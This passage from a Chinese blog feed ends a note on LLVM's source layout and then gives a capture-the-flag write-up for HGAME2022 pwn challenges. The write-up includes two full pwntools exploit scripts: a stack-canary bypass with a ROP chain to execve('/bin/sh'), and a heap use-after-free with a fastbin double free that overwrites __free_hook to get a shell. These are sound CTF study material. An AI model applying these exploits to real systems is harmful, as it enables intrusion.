├── compiler-rt
├── cross-project-tests
├── flang
├── install
├── libc
├── libclc
├── libcxx
├── libcxxabi
├── libunwind
├── lld
├── lldb
├── llvm
├── llvm-libgcc
├── mlir
├── openmp
├── polly
├── pstl
├── runtimes
├── third-party
└── utils<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>部分源代碼結構</p>
<ul>
<li>bolt：Meta developed a <code>post-link optimizer</code> with <code>feedback-driven optimizations (FDO)</code> and <code>link-time optimizations (LTO)</code>。通俗的說就是把編譯後的信息用於編譯期。關於這個 Meta 發表了相關文章</li>
<li>clang-tools-extra：内容和目錄的名字一樣，可惜我只認得 <code>clangd</code>，<code>clangd</code> 是 <code>language server</code> ，它提供了 IDE 的一些功能比如交叉索引等等，讓 vscode 更適合閲讀某些源代碼</li>
<li>clang：適用於 C 家族的編譯器前端</li>
<li>compiler-rt：提供了語言獨立的庫，如 fuzz 庫</li>
<li>libc，libclc，libcxx，libcxxabi：提供了一些庫給 C，C++等語言</li>
<li>libunwind：提供了棧展開，可以用於異常處理</li>
<li>lld：LLVM linker</li>
<li>lldb：LLVM debugger</li>
<li>mlir：用於拓展 LLVM IR 在編譯時丟失信息的問題，這麽看來和 bolt 有一定的相似性。</li>
<li>polly：Polly is a high-level loop and data-locality optimizer and optimization infrastructure for LLVM <a href="https://polly.llvm.org/">https://polly.llvm.org/</a></li>
</ul>
<p>參考資料</p>
<ul>
<li><a href="https://llvm.org/docs/GettingStartedTutorials.html">https://llvm.org/docs/GettingStartedTutorials.html</a></li>
<li><a href="https://llvm.org/doxygen/modules.html">https://llvm.org/doxygen/modules.html</a></li>
<li>learn llvm 12</li>
</ul>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME2022_partialPWN</title>
    <url>/2022/04/07/HGAME2022-partialPWN/</url>
    <content><![CDATA[<blockquote>
<p>直接进行一手记录，因为 pwn 太菜所以必须好好记录一下。队友也给我好多帮助，感激不尽。</p>
</blockquote>
<h2 id="enter-the-evil-pwn-land"><a href="#enter-the-evil-pwn-land" class="headerlink" title="enter_the_evil_pwn_land"></a>enter_the_evil_pwn_land</h2><p>看了 chuj 的解法之后才发现 pwn 的工具好丰富，为什么以前我会写的那么艰涩（<br>很普通的栈溢出，但是要绕过 canary，大致有两种方法，一种是直接覆盖到 TLS 结构体里面的 stack_guard，而 TLS 结构体在栈的高地址处，如果能输入的范围很大，就可以直接覆盖。另外一种就是泄露，格式化字符串等手段。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment">/* Pointer to the TCB.  Not necessarily the
               thread descriptor used by libpthread.  */</span>
  <span class="token class-name">dtv_t</span> <span class="token operator">*</span>dtv<span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>        <span class="token comment">/* Pointer to the thread descriptor.  */</span>
  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>
  <span class="token keyword">int</span> gscope_flag<span class="token punctuation">;</span>
  <span class="token class-name">uintptr_t</span> sysinfo<span class="token punctuation">;</span>
  <span class="token class-name">uintptr_t</span> stack_guard<span class="token punctuation">;</span>
  <span class="token class-name">uintptr_t</span> pointer_guard<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">int</span> vgetcpu_cache<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token comment">/* Bit 0: X86_FEATURE_1_IBT.
     Bit 1: X86_FEATURE_1_SHSTK.
   */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> feature_1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> __glibc_unused1<span class="token punctuation">;</span>
  <span class="token comment">/* Reservation of some values for the TM ABI.  */</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>__private_tm<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token comment">/* GCC split stack support.  */</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>__private_ss<span class="token punctuation">;</span>
  <span class="token comment">/* The lowest address of shadow stack,  */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> ssp_base<span class="token punctuation">;</span>
  <span class="token comment">/* Must be kept even if it is no longer used by glibc since programs,
     like AddressSanitizer, depend on the size of tcbhead_t.  */</span>
  __128bits __glibc_unused2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">void</span> <span class="token operator">*</span>__padding<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token class-name">tcbhead_t</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./a.out'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">6666</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>

<span class="token comment"># dbg('set follow-fork-mode child\nb *0x401240')</span>

prdi <span class="token operator">=</span> <span class="token number">0x401363</span>
test_thread <span class="token operator">=</span> <span class="token number">0x4011D6</span>

<span class="token comment"># pay = b'a' * 0x28</span>
<span class="token comment"># sl(pay)</span>
<span class="token comment"># ru(b'\n')</span>
<span class="token comment"># fsbase = uu64(b'\x00' + ru(b'\n'))</span>
<span class="token comment"># print("***",hex(fsbase))</span>

rop_chain <span class="token operator">=</span> <span class="token string">b''</span>
rop_chain <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>prdi<span class="token punctuation">,</span>binary<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> test_thread<span class="token punctuation">]</span><span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
pay <span class="token operator">+=</span> rop_chain
pay <span class="token operator">=</span> pay<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x840</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span>

sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>

puts <span class="token operator">=</span> uu64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span>
lbase <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
execve <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'execve'</span><span class="token punctuation">]</span>

prdx_rcx_rbx <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x1056fd</span>
prsi <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x27529</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>prdx_rcx_rbx<span class="token punctuation">)</span><span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
pay <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>prdi<span class="token punctuation">,</span>binsh<span class="token punctuation">]</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>prsi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>prdx_rcx_rbx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>execve<span class="token punctuation">)</span>

sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="oldfashion-note"><a href="#oldfashion-note" class="headerlink" title="oldfashion_note"></a>oldfashion_note</h2><p>libc-2.31.so，保护全开</p>
<p>delete 函数存在 UAF，先通过 unsorted bin 泄露 main_arena 进一步泄露 libc 基址。再通过 fastbin attack，在 fastbin 上 double free，然后放入 tcache 进入分配，实现任意地址写。这个漏洞的原因是因为 fastbin 的校验不够严格。</p>
<p>原理如图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220407120319821.png" alt="image-20220407120319821"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>


host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span>
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./note'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
ld   <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ld-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> sz<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> data <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'show--me'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'show--me'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'show--me'</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
main_arena96 <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
__malloc_hook_mem <span class="token operator">=</span> main_arena96<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span><span class="token number">0x10</span>
__malloc_hook_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
lbase <span class="token operator">=</span> __malloc_hook_mem <span class="token operator">-</span> __malloc_hook_libc
__free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
mysystem <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
<span class="token comment"># print("[-]",hex(__malloc_hook_mem))</span>
delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xE</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># add(7, 0x70, p64(__malloc_hook_mem))</span>
add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-]'</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>mysystem<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>mysystem<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># dbg()</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
